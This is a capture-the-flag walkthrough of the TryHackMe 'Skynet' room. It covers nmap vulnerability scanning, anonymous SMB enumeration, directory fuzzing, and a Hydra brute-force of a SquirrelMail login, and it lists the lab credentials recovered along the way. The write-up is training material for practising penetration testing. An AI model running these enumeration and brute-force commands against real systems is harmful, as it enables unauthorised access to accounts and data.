# [Skynet - TryHackMe](https://tryhackme.com/room/skynet) | 0x00FFFF

A vulnerable Terminator themed Linux machine.

## Credits

- Room created by [tryhackme](https://tryhackme.com/p/tryhackme)
- Room type: Premium

## Recon

### nmap

- `nmap -sV -sC --script=vuln <target ip>` - basic scan with service versions and scripts
    - *-sV* enables service version detection
    - *-sC* enables default scripts
    - *--script=vuln* specifies the "vuln" script to scan for vulnerabilities
    - Optional:
        - *-A* to use all standard options
        - *-T5* highest timing setting for fastest scan (also the loudest and most detectable)

#### Output

- [Full output here](/THM/skynet/nmapOut)

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 16:FF:D6:B9:E6:C1 (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumerating SMB

- List smb shares to look for information
    - `smbclient -L //<target ip>/`
    - `smbmap -H <target ip> -u anonymous`
    - *anonymous* share is readable with no credentials
    - There is a share named *milesdyson*
        - Suggests a user account with that name
- `smbclient //<target ip>/anonymous -U anonymous` to access the share
    - `get attention.txt` to download file
    - repeat for files in the *log* directory
    - *log1.txt* appears to be a password list

### Exploring web server

- Navigating to the server on port 80 in a web browser displays one page with a search bar
- No links
- Search and buttons do not seem functional

#### Fuzzing/Discovery

- ffuf to find hidden directories
    - `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://<target ip>/FUZZ -recursion`
- Multiple 301 endpoints: /admin, /config, /css, /ai
- Interesting endpoint: /squirrelmail
    - Leads to login page for squirrelmail

## Initial Access

- Use Hydra to brute force squirrelmail login page
    - `hydra -l milesdyson -P log1.txt <target ip> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown"`
    - Valid credentials found"
        - milesdyson
        - cyborg007haloterminator
- Most recent email mentions SAMBA password reset
    - *milesdyson* SAMBA password is *)s{A&2Z=F^n_E.B`*
- `smbclient //<target ip>/milesdyson -U milesdyson`
- There is one .txt file in *milesdyson*'s share: important.txt
